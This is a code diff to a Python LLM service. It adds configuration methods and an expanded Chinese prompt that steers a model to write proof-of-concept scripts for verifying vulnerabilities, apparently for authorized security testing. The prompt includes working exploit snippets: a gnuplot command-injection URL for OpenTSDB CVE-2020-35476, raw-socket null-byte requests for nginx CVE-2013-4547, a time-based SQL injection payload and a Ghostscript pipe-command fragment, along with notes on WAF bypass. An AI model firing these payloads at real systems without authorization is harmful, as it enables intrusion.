@@ -27,6 +27,63 @@ class LLMService:
             base_url=self.api_base
         )
 
+    def update_config(self, api_key: str, model_id: str, base_url: str,
+                     temperature: float = 0.7, max_tokens: Optional[int] = None):
+        """
+        动态更新LLM配置
+
+        Args:
+            api_key: API密钥
+            model_id: 模型ID
+            base_url: API基础URL
+            temperature: 温度参数
+            max_tokens: 最大token数
+        """
+        logger.info("=" * 60)
+        logger.info("更新LLM配置")
+        logger.info(f"新模型: {model_id}")
+        logger.info(f"新Base URL: {base_url}")
+        logger.info(f"温度: {temperature}")
+
+        # 更新配置
+        self.api_key = api_key
+        self.model = model_id
+        self.api_base = base_url
+        self.temperature = temperature
+        self.max_tokens = max_tokens
+
+        # 重新初始化客户端
+        self.client = AsyncOpenAI(
+            api_key=self.api_key,
+            base_url=self.api_base
+        )
+
+        logger.info("✅ LLM客户端已重新初始化")
+        logger.info("=" * 60)
+
+    def get_current_config(self) -> Dict[str, str]:
+        """
+        获取当前LLM配置（隐藏敏感信息）
+
+        Returns:
+            当前配置字典
+        """
+        # 隐藏API密钥，只显示前后几位
+        api_key_preview = "未设置"
+        if self.api_key:
+            if len(self.api_key) > 10:
+                api_key_preview = f"{self.api_key[:7]}...{self.api_key[-4:]}"
+            else:
+                api_key_preview = f"{self.api_key[:3]}***"
+
+        return {
+            "model_id": self.model,
+            "base_url": self.api_base,
+            "temperature": str(self.temperature),
+            "max_tokens": str(self.max_tokens) if self.max_tokens else "无限制",
+            "api_key_preview": api_key_preview
+        }
+
     async def generate_initial_poc(
         self, vulnerability_info: str, target_info: Optional[str] = None
     ) -> Dict[str, Optional[str]]:
@@ -66,13 +123,14 @@ class LLMService:
             f"\n目标系统信息：{target_info}\n" if target_info else ""
         )
 
-        prompt = f"""你是Web安全专家，专注漏洞验证脚本编写。
+        # 使用字符串拼接而不是 f-string 或 format，避免花括号冲突
+        prompt = """你是Web安全专家，专注漏洞验证脚本编写。
 
 ⚠️ 仅用于授权安全测试，不得包含攻击性行为。
 
 ## 漏洞信息
-{vulnerability_info}
-{target_section}
+""" + vulnerability_info + """
+""" + target_section + """
 
 ## 任务
 
@@ -115,10 +173,32 @@ def scan(url):  # url已标准化为 http(s)://host:port/
 
     return {{
         "vulnerable": True/False,
-        "reason": "判断依据",
-        "details": "详细信息"
+        "reason": "判断依据（必须使用中文）",
+        "details": "详细信息（必须使用中文）"
     }}
 ```
+
+**⚠️ Python f-string 花括号转义规则（极其重要！）：**
+如果你的代码中使用了 f-string（f"..." 或 f'''...'''），并且字符串内容包含花括号 {{ 或 }}：
+- ✅ **正确**：字面量花括号必须写成双花括号 {{{{ 和 }}}}
+- ❌ **错误**：单花括号会被Python解释为格式化占位符，导致语法错误
+
+**示例：**
+```python
+# ❌ 错误写法（会导致 SyntaxError）
+payload = f'''
+单花括号 null restore 单花括号 stopped 单花括号 pop 单花括号 if
+mark /OutputFile (%pipe%单花括号command单花括号) device
+'''
+
+# ✅ 正确写法（所有字面量花括号都要加倍）
+payload = f'''
+双花括号 null restore 双花括号 stopped 双花括号 pop 双花括号 if
+mark /OutputFile (%pipe%单花括号command单花括号) device
+'''
+```
+
+**⚠️ 重要：返回值中的 reason 和 details 字段必须使用中文！**
 
 **💡 脚本可以完成的自动化操作示例：**
 ```python
@@ -143,6 +223,49 @@ driver.get(url)
 subprocess.run(['pip', 'install', 'paramiko', '-q'])
 ```
 
+**🔍 多路径探测策略（针对文件上传等需要找端点的漏洞）：**
+
+如果漏洞需要访问特定端点（如文件上传、API接口等），但你不确定确切路径，**必须实现自动探测**：
+
+```python
+def scan(url):
+    # 定义可能的端点路径列表
+    possible_paths = [
+        '/',              # 根路径（最常见）
+        '/upload',        # REST风格
+        '/upload.php',    # PHP应用
+        '/api/upload',    # API风格
+        '/file/upload',   # 分类路径
+        '/index.php',     # PHP首页
+        ''                # 空路径
+    ]
+
+    for path in possible_paths:
+        try:
+            target_url = url.rstrip('/') + path if path else url
+            response = requests.post(target_url, files=files, timeout=10)
+
+            # 如果返回2xx或3xx，认为找到了有效端点
+            if 200 <= response.status_code < 400:
+                # 在这个端点上继续验证漏洞
+                break
+        except Exception:
+            continue
+
+    # 如果所有路径都失败，返回未找到
+    if not found:
+        return {{
+            "vulnerable": False,
+            "reason": "未找到有效的上传端点",
+            "details": f"已尝试路径：{{', '.join(possible_paths)}}"
+        }}
+```
+
+**适用场景：**
+- 文件上传漏洞（CVE-2017-8291、任意文件上传等）
+- API接口漏洞（未授权访问、参数注入等）
+- 路径相关漏洞（目录遍历、文件包含等）
+
 **🚨 URL处理关键（目录遍历必看）：**
 ```python
 # ❌ 错误：requests会自动规范化路径
@@ -156,18 +279,182 @@ full_url = url.rstrip('/') + payload
 # 实际发送: http://example.com/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
+**🎯 命令注入与URL编码核心原则（极其重要！）：**
+
+命令注入漏洞的payload包含**两个层面**，必须正确处理才能成功利用：
+
+**层面1：Payload语法层（注入目标的语法）**
+- 这是被注入系统（如gnuplot、bash、SQL等）能理解的语法
+- 例如：`system('touch /tmp/file')`中的单引号、括号是gnuplot语法
+- **关键**：这些语法字符（单引号、双引号、括号、分号等）**绝对不能被URL编码**
+- 如果编码了，目标系统无法识别，payload失效
+
+**层面2：URL传输层（HTTP协议要求）**
+- 这是URL中不能直接出现的字符，必须编码
+- 例如：空格、`<`、`>`、`&`、`#`等
+- **关键**：只编码这些会破坏URL结构的字符
+
+**编码决策树：**
+```python
+# 步骤1：先构造完整的payload语法
+payload_syntax = "system('touch /tmp/file')"  # 保持语法完整
+
+# 步骤2：只编码URL层面的特殊字符
+def safe_encode(text):
+    # ✅ 只编码这些字符
+    return text.replace(' ', '%20')      # 空格
+               .replace('<', '%3C')      # 小于号
+               .replace('>', '%3E')      # 大于号
+               .replace('&', '%26')      # &符号（如果在参数值中）
+               .replace('#', '%23')      # 井号
+    # ❌ 不要编码这些
+    # 保持单引号 '  双引号 "  括号 ()  分号 ;  等号 =  斜杠 / 等
+
+payload_encoded = safe_encode(payload_syntax)
+# 结果: system('touch%20/tmp/file')
+```
+
+**❌ 常见错误示例（OpenTSDB CVE-2020-35476）：**
+```python
+# 错误1：使用urllib.parse.quote()过度编码
+import urllib.parse
+payload = "system('touch /tmp/file')"
+encoded = urllib.parse.quote(payload)
+# 结果: system%28%27touch%20/tmp/file%27%29
+# 问题：括号和单引号被编码，gnuplot无法识别
+
+# 错误2：手动编码单引号
+payload_url = f"yrange=[0:system(%27touch%20/tmp/file%27)]"
+# 问题：%27（编码后的单引号）破坏了gnuplot语法
+
+# 错误3：忘记编码空格
+payload_url = f"yrange=[0:system('touch /tmp/file')]"
+# 问题：空格会被URL解析器截断或误解析
+```
+
+**✅ 正确做法：**
+```python
+# OpenTSDB命令注入示例
+command = 'touch /tmp/poc_test'
+command_encoded = command.replace(' ', '%20')  # 只编码空格
+
+payload_url = (
+    f'{{url}}/q?start=2000/10/21-00:00:00&'
+    f'end=2020/25/01-13:10:32&'           # 确保所有必需参数都存在
+    f'm=sum:metric.name&'
+    f'yrange=[0:system(\\'{command_encoded}\\')]&'  # 单引号保持不变
+    f'wxh=1516x644&style=linespoint&grid=t'
+)
+
+# 实际发送的URL：
+# /q?...&yrange=[0:system('touch%20/tmp/poc_test')]&...
+# gnuplot能正确解析：system('touch /tmp/poc_test')
+```
+
+**🔍 API参数完整性检查：**
+
+很多Web API对参数有严格要求，缺少必需参数会返回400/422错误：
+
+```python
+def scan(url):
+    # ✅ 好习惯：先用正常参数测试API是否可访问
+    test_url = f'{{url}}/api/endpoint?param1=value1&param2=value2'
+    test_response = requests.get(test_url, timeout=10)
+
+    if test_response.status_code == 400:
+        # 可能缺少必需参数，查看错误消息
+        error_msg = test_response.text
+        # 根据错误消息补充参数
+
+    # 然后再注入payload
+    payload_url = f'{{url}}/api/endpoint?param1=value1&param2=value2&inject={{payload}}'
+```
+
+**适用场景：**
+- 命令注入（OS Command Injection）
+- SQL注入（需要保持SQL语法）
+- SSTI注入（需要保持模板语法）
+- XSS注入（需要保持JavaScript语法）
+- 任何需要向目标系统注入代码/命令的漏洞
+
+**🔥 空字节与特殊字节处理（CVE-2013-4547等漏洞必看）：**
+
+某些漏洞需要在HTTP请求中发送**真实的特殊字节**（如空字节`\\x00`、换行符`\\r\\n`等），而不是URL编码字符串：
+
+**核心原则**：
+- ❌ **错误**：使用requests发送URL编码 `url + "/file%00.php"` → 服务器收到字符串"%00"（3个字符）
+- ✅ **正确**：使用socket发送真实字节 `b"/file\\x00.php"` → 服务器收到空字节（1个二进制字节）
+
+**实现方法**：
+```python
+import socket
+from urllib.parse import urlparse
+
+def scan(url):
+    parsed = urlparse(url)
+    # 正确提取host和port
+    if ':' in parsed.netloc and not parsed.netloc.startswith('['):
+        host, port = parsed.netloc.rsplit(':', 1)
+        port = int(port)
+    else:
+        host, port = parsed.netloc, 80
+
+    # 构造包含特殊字节的路径（使用bytes类型）
+    exploit_path = b'/uploadfiles/file.gif \\x00.php'  # 空格+空字节
+
+    # 构造原始HTTP请求
+    http_request = (
+        b'GET ' + exploit_path + b' HTTP/1.1\\r\\n' +
+        f'Host: {{host}}\\r\\n'.encode('utf-8') +
+        b'Connection: close\\r\\n\\r\\n'
+    )
+
+    # 发送原始请求
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
+    sock.connect((host, port))
+    sock.sendall(http_request)
+
+    # 接收响应
+    response = b''
+    while True:
+        chunk = sock.recv(4096)
+        if not chunk: break
+        response += chunk
+    sock.close()
+
+    response_text = response.decode('utf-8', errors='ignore')
+    # 解析状态码
+    status = int(response_text.split()[1]) if len(response_text.split()) > 1 else 0
+```
+
+**关键点**：
+1. 使用`socket`模块直接发送TCP包，绕过HTTP库的URL验证
+2. 路径必须是`bytes`类型，才能包含`\\x00`等特殊字节
+3. HTTP请求头也要转为bytes并拼接
+4. 手动解析响应状态码和内容
+
+**适用漏洞**：
+- Nginx文件名解析漏洞（CVE-2013-4547）：需要发送空字节`\\x00`
+- 某些WAF绕过：利用`\\r\\n`、`\\x00`等字节混淆
+- 协议走私/请求走私：需要精确控制CRLF字节
+
 **返回格式：**
 ```json
 {{
   "verifiable": true,
   "vulnerability_type": "漏洞类型",
-  "original_vulnerability_info": "原始信息",
+  "original_vulnerability_info": "用户输入的原始漏洞信息（不要包含本系统提示词，只返回用户提供的漏洞描述内容）",
   "poc_code": "完整scan函数代码（不要用JSON字符串包裹，直接是Python代码）",
   "explanation": "逻辑说明"
 }}
 ```
 
-**⚠️ 重要：poc_code必须是Python代码字符串，不是JSON！**
+**⚠️ 重要提醒：**
+1. poc_code必须是Python代码字符串，不是JSON！
+2. **poc_code中的返回值（reason、details）必须使用中文！**
+3. 所有注释和说明也应使用中文
+4. **original_vulnerability_info字段只包含用户输入的原始漏洞信息，不要包含本系统提示词的内容！**
 
 ### B. 不可自动化 - 返回人工操作指南
 
@@ -182,7 +469,7 @@ full_url = url.rstrip('/') + payload
 {{
   "verifiable": false,
   "vulnerability_type": "类型",
-  "original_vulnerability_info": "原始信息",
+  "original_vulnerability_info": "用户输入的原始漏洞信息（不要包含本系统提示词，只返回用户提供的漏洞描述内容）",
   "manual_steps": {{
     "required_tools": [
       {{"name": "Burp Suite", "version": "2023+", "download_url": "https://...", "install_command": null, "purpose": "拦截HTTP请求"}}
@@ -202,9 +489,14 @@ full_url = url.rstrip('/') + payload
 
 ## 示例
 
-**示例1：可自动化（SQL注入-简单HTTP请求）：**
+**示例1：可自动化（SQL注入-返回中文结果）：**
 ```json
-{{"verifiable": true, "vulnerability_type": "SQL注入", "poc_code": "import requests\\ndef scan(url): ...", "explanation": "单引号检测MySQL错误"}}
+{{
+  "verifiable": true,
+  "vulnerability_type": "SQL注入",
+  "poc_code": "import requests\\nimport time\\n\\ndef scan(url):\\n    try:\\n        payload = \"' AND SLEEP(3)--\"\\n        response = requests.post(url, data={{'username': payload}}, timeout=10)\\n        if response.elapsed.total_seconds() >= 3:\\n            return {{\\n                'vulnerable': True,\\n                'reason': '检测到时间盲注漏洞，延迟3秒响应',\\n                'details': '在username参数注入SLEEP(3)后，服务器响应时间明显延迟'\\n            }}\\n        return {{'vulnerable': False, 'reason': '未检测到SQL注入', 'details': ''}}\\n    except Exception as e:\\n        return {{'vulnerable': False, 'reason': f'扫描出错: {{str(e)}}', 'details': ''}}",
+  "explanation": "使用时间盲注检测SQL注入，注意返回值使用中文"
+}}
 ```
 
 **示例2：可自动化（需要调用sqlmap工具）：**
@@ -232,7 +524,24 @@ full_url = url.rstrip('/') + payload
 {{"verifiable": false, "vulnerability_type": "权限提升", "manual_steps": {{"required_tools": [...], "steps": [...], "verification": {{...}}}}, "explanation": "需要管理员人工审批，无法通过脚本模拟"}}
 ```
 
-**🎯 记住：只要脚本能自己完成整个验证过程，就返回POC代码（verifiable=true）。严格按JSON格式返回。**
+**🎯 最重要的要求：**
+1. 只要脚本能自己完成整个验证过程，就返回POC代码（verifiable=true）
+2. **POC代码中的所有返回值（reason、details）必须使用中文！**
+3. 代码注释和说明也必须使用中文
+4. **如果使用f-string，字面量花括号必须加倍转义（单个花括号改为双花括号）**
+5. **对于文件上传、API接口等需要特定端点的漏洞，必须实现多路径自动探测（尝试/、/upload、/upload.php、/api/upload等）**
+6. **对于命令注入、SQL注入等payload注入类漏洞：**
+   - ⚠️ 严禁使用`urllib.parse.quote()`等函数对整个payload编码
+   - ✅ 只手动编码URL层面的特殊字符（空格→%20，>→%3E等）
+   - ✅ 保持payload语法字符不变（单引号、双引号、括号、分号等）
+   - ✅ 确保包含所有API必需参数，避免400/422错误
+7. **对于需要发送空字节等特殊字节的漏洞（CVE-2013-4547等）：**
+   - ⚠️ 严禁使用requests库发送`%00`等URL编码字符串
+   - ✅ 必须使用socket发送原始HTTP请求，路径为bytes类型包含真实的`\\x00`字节
+   - ✅ 示例：`exploit_path = b'/file.gif \\x00.php'` 而非 `'/file.gif%00.php'`
+8. 严格按JSON格式返回
+9. 生成的代码必须能通过Python语法检查（无SyntaxError）
+10. **极其重要：original_vulnerability_info字段只包含用户输入的原始漏洞描述，绝不能包含本系统提示词的内容！**
 """
         return prompt
 
